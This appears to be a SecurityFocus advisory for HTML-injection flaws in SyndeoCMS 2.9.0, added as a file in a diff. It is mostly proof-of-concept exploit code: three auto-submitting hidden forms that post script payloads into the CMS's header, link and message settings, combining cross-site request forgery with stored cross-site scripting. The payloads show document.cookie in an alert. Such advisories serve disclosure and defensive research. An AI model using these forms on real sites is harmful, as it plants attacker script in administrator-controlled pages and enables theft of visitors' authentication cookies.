@@ -1,0 +1,109 @@
+source: http://www.securityfocus.com/bid/41989/info
+
+SyndeoCMS is prone to multiple HTML-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+SyndeoCMS 2.9.0 is vulnerable; prior versions may also be affected. 
+
+<form action="http://www.example.com/starnet/index.php?option=modulemanager&module=3&modoption=saveconfig" method="post" name="main" >
+
+<input type="hidden" name="general[0]" value="1" />
+<input type="hidden" name="general[1]" value="#99FFFF" />
+<input type="hidden" name="general[2]" value="900" />
+<input type="hidden" name="general[3]" value="1" />
+<input type="hidden" name="general[4]" value="#000066" />
+<input type="hidden" name="header[1]" value="header4.php" />
+<input type="hidden" name="header[2]" value="290" />
+<input type="hidden" name="header[3]" value=&#039;starnet/media/header-bg.jpg"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="header[4]" value="Century Schoolbook" />
+<input type="hidden" name="header[5]" value="55" />
+<input type="hidden" name="header[6]" value="#FFFFFF" />
+<input type="hidden" name="header[7]" value="0" />
+<input type="hidden" name="header[0]" value="1" />
+<input type="hidden" name="section[1]" value="section1.php" />
+<input type="hidden" name="section[2]" value="#FF0000" />
+<input type="hidden" name="section[3]" value="#99CC99" />
+<input type="hidden" name="section[4]" value="#0099CC" />
+<input type="hidden" name="section[5]" value="Arial" />
+<input type="hidden" name="section[6]" value="14" />
+<input type="hidden" name="section[7]" value="#FFFFFF" />
+<input type="hidden" name="section[8]" value="100" />
+<input type="hidden" name="section[9]" value="#0099CC" />
+<input type="hidden" name="section[0]" value="1" />
+<input type="hidden" name="status[1]" value="status3.php" />
+<input type="hidden" name="status[2]" value="#FF33FF" />
+<input type="hidden" name="status[3]" value="Arial" />
+<input type="hidden" name="status[4]" value="10" />
+<input type="hidden" name="status[5]" value="#CCFFCC" />
+<input type="hidden" name="status[6]" value="Location:" />
+<input type="hidden" name="status[7]" value="" />
+<input type="hidden" name="status[8]" value="" />
+<input type="hidden" name="status[9]" value="" />
+<input type="hidden" name="status[0]" value="1" />
+<input type="hidden" name="menu[1]" value="menu1.php" />
+<input type="hidden" name="menu[2]" value="#CC66FF" />
+<input type="hidden" name="menu[3]" value="#FF9966" />
+<input type="hidden" name="menu[4]" value="#FF66FF" />
+<input type="hidden" name="menu[5]" value="#CCCC99" />
+<input type="hidden" name="menu[6]" value="Arial" />
+<input type="hidden" name="menu[7]" value="14" />
+<input type="hidden" name="menu[8]" value="#000000" />
+<input type="hidden" name="menu[9]" value="starnet/themes/editable/arrow_blue.gif" />
+<input type="hidden" name="menu[0]" value="1" />
+<input type="hidden" name="content[0]" value="content1.php" />
+<input type="hidden" name="content[1]" value="#FFFFFF" />
+<input type="hidden" name="content[2]" value="#FFFF99" />
+<input type="hidden" name="content[3]" value="630" />
+<input type="hidden" name="content[4]" value="500" />
+<input type="hidden" name="content[5]" value="Arial" />
+<input type="hidden" name="content[6]" value="10" />
+<input type="hidden" name="content[7]" value="#000000" />
+<input type="hidden" name="content[8]" value="1" />
+<input type="hidden" name="footer[1]" value="footer2.php" />
+<input type="hidden" name="footer[2]" value="#003366" />
+<input type="hidden" name="footer[3]" value="Arial" />
+<input type="hidden" name="footer[4]" value="10" />
+<input type="hidden" name="footer[5]" value="#FFFFFF" />
+<input type="hidden" name="footer[6]" value="Page last changed:" />
+<input type="hidden" name="footer[7]" value="25" />
+<input type="hidden" name="footer[0]" value="1" />
+<input type="hidden" name="savebutton" value=" Save" />
+
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+<form action="http://www.example.com/starnet/index.php?option=modulemanager&module=2&modoption=save_link&suboption=&page_id=3&link_id=2" method="post" name="main" >
+
+<input type="hidden" name="link_category" value="ICT">
+<input type="hidden" name="link_title" value="Google">
+<input type="hidden" name="link_url" value="http://www.google.com">
+<input type="hidden" name="link_description" value=&#039;Search Engine."><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="link_sort" value="1">
+<input type="hidden" name="page_id" value="3">
+<input type="hidden" name="initial" value="1">
+<input type="hidden" name="savebutton" value=" Save" >
+
+
+
+<form action="http://www.example.com/starnet/index.php?option=modulemanager&module=13&modoption=save_message&suboption=&message_id=1&cat_id=4" method="post" name="main" >
+
+<input type="hidden" name="intro_message" value="Holiday">
+<input type="hidden" name="days" value="0">
+<input type="hidden" name="page_id" value="4">
+<input type="hidden" name="name" value="Director">
+<input type="hidden" name="date" value="09-07-2010">
+<input type="hidden" name="message" value=&#039;Next week is a holiday so all the children are free"><script>alert(document.cookie)</script>&#039; >
+<input type="hidden" name="savebutton" value=" Save">
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
